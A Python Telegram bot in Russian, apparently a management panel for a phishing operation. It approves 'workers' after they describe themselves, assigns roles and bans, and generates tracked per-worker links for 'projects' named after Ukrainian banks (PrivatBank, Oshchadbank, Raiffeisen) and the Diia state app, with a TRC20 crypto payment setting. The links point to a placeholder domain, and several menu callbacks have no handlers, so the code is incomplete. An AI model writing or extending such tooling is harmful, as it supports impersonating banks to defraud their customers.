import asyncio
import os
import sqlite3
import uuid
from datetime import datetime

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton,
    CallbackQuery
)
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State


BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8468065089

PHOTO_FILE_ID = "AgACAgUAAxkBAAEcSFFpvKqbYr0IfiMOKypItDtDip7SXgACJw5rG8Vq6VX8OCc0sIop2AEAAwIAA3gAAzoE"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# -------------------- БД --------------------

conn = sqlite3.connect("bot.db")
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    approved INTEGER DEFAULT 0,
    role TEXT DEFAULT 'worker',
    banned INTEGER DEFAULT 0
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS links (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    project TEXT,
    price INTEGER,
    link TEXT
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS settings (
    user_id INTEGER PRIMARY KEY,
    tag TEXT DEFAULT '#',
    domain TEXT DEFAULT 'Общий',
    payment TEXT DEFAULT 'TRC20',
    traffic INTEGER DEFAULT 0
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    action TEXT,
    user_id INTEGER,
    time TEXT
)
""")

conn.commit()


# -------------------- УТИЛИТЫ --------------------

def log(action, user_id):
    cursor.execute(
        "INSERT INTO logs (action, user_id, time) VALUES (?, ?, ?)",
        (action, user_id, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    )
    conn.commit()


def get_role(user_id):
    cursor.execute("SELECT role FROM users WHERE user_id=?", (user_id,))
    row = cursor.fetchone()
    return row[0] if row else "worker"


def set_role(user_id, role):
    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    cursor.execute("UPDATE users SET role=? WHERE user_id=?", (role, user_id))
    conn.commit()


def is_banned(user_id):
    cursor.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
    row = cursor.fetchone()
    return row and row[0] == 1


def set_ban(user_id, value):
    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    cursor.execute("UPDATE users SET banned=? WHERE user_id=?", (value, user_id))
    conn.commit()


# 👉 ты сразу админ
set_role(ADMIN_ID, "admin")


def approve_user(user_id: int):
    cursor.execute("INSERT OR IGNORE INTO users (user_id, approved) VALUES (?, 0)", (user_id,))
    cursor.execute("UPDATE users SET approved=1 WHERE user_id=?", (user_id,))
    conn.commit()


def is_approved(user_id: int) -> bool:
    cursor.execute("SELECT approved FROM users WHERE user_id=?", (user_id,))
    result = cursor.fetchone()
    return result and result[0] == 1


def get_settings(user_id):
    cursor.execute("SELECT * FROM settings WHERE user_id=?", (user_id,))
    data = cursor.fetchone()

    if not data:
        cursor.execute("INSERT INTO settings (user_id) VALUES (?)", (user_id,))
        conn.commit()
        return get_settings(user_id)

    return {
        "tag": data[1],
        "domain": data[2],
        "payment": data[3],
        "traffic": data[4]
    }


# -------------------- FSM --------------------

class Form(StatesGroup):
    about = State()
    source = State()
    price = State()
    tag = State()


# -------------------- КНОПКИ --------------------

def main_menu_kb(user_id):
    buttons = [
        [InlineKeyboardButton(text="🏝 Создать ссылку", callback_data="create_link")],
        [InlineKeyboardButton(text="🤍 Мои объявления", callback_data="my_posts")],
        [InlineKeyboardButton(text="🍬 Настройки", callback_data="settings")]
    ]

    if get_role(user_id) == "admin":
        buttons.append([InlineKeyboardButton(text="🛠 Админ панель", callback_data="admin_panel")])

    return InlineKeyboardMarkup(inline_keyboard=buttons)


def projects_kb():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🇺🇦 Приват", callback_data="proj_privat"),
             InlineKeyboardButton(text="🇺🇦 Ощад", callback_data="proj_oshad")],
            [InlineKeyboardButton(text="🇺🇦 Райффайзен", callback_data="proj_raif"),
             InlineKeyboardButton(text="🇺🇦 Дия", callback_data="proj_diya")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_menu")]
        ]
    )


def settings_kb(traffic):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="✍️ изменить тэг", callback_data="set_tag")],
            [InlineKeyboardButton(
                text="✅ вкл переходы" if not traffic else "❌ выкл переходы",
                callback_data="toggle_traffic"
            )],
            [InlineKeyboardButton(text="⬅️ назад", callback_data="back_menu")]
        ]
    )


def generate_link(user_id, project):
    unique = str(uuid.uuid4())[:8]
    return f"https://example.com/{project}?user={user_id}&id={unique}"


# -------------------- МЕНЮ --------------------

async def send_main_menu(user_id, username):
    await bot.send_photo(
        chat_id=user_id,
        photo=PHOTO_FILE_ID,
        caption=f"Привет {username}",
        reply_markup=main_menu_kb(user_id)
    )


# -------------------- АДМИН ПАНЕЛЬ --------------------

@dp.callback_query(F.data == "admin_panel")
async def admin_panel(callback: CallbackQuery):
    await callback.answer()

    if get_role(callback.from_user.id) != "admin":
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👥 Пользователи", callback_data="admin_users")],
        [InlineKeyboardButton(text="📜 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_menu")]
    ])

    await callback.message.edit_caption("🛠 Админ панель", reply_markup=kb)


@dp.callback_query(F.data == "admin_users")
async def admin_users(callback: CallbackQuery):
    await callback.answer()

    cursor.execute("SELECT user_id, role, banned FROM users")
    rows = cursor.fetchall()

    text = ""
    for uid, role, banned in rows:
        text += f"{uid} | {role} | {'🚫' if banned else '✅'}\n"

    await callback.message.edit_caption(text)


@dp.callback_query(F.data == "admin_logs")
async def admin_logs(callback: CallbackQuery):
    await callback.answer()

    cursor.execute("SELECT action, user_id, time FROM logs ORDER BY id DESC LIMIT 10")
    rows = cursor.fetchall()

    text = ""
    for action, uid, time in rows:
        text += f"{time} | {uid} | {action}\n"

    await callback.message.edit_caption(text)


# -------------------- БАН --------------------

@dp.message(F.text.startswith("/ban "))
async def ban(message: Message):
    if get_role(message.from_user.id) != "admin":
        return

    user_id = int(message.text.split()[1])
    set_ban(user_id, 1)
    log("ban", user_id)

    await message.answer("🚫 Забанен")


@dp.message(F.text.startswith("/unban "))
async def unban(message: Message):
    if get_role(message.from_user.id) != "admin":
        return

    user_id = int(message.text.split()[1])
    set_ban(user_id, 0)
    log("unban", user_id)

    await message.answer("✅ Разбанен")


# -------------------- СТАРТ --------------------

@dp.message(CommandStart())
async def start(message: Message, state: FSMContext):
    user_id = message.from_user.id

    if is_banned(user_id):
        await message.answer("🚫 Ты забанен")
        return

    if is_approved(user_id):
        await send_main_menu(user_id, message.from_user.full_name)
        return

    await message.answer("Расскажи о себе:")
    await state.set_state(Form.about)


# -------------------- RUN --------------------

async def main():
    print("Bot started!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
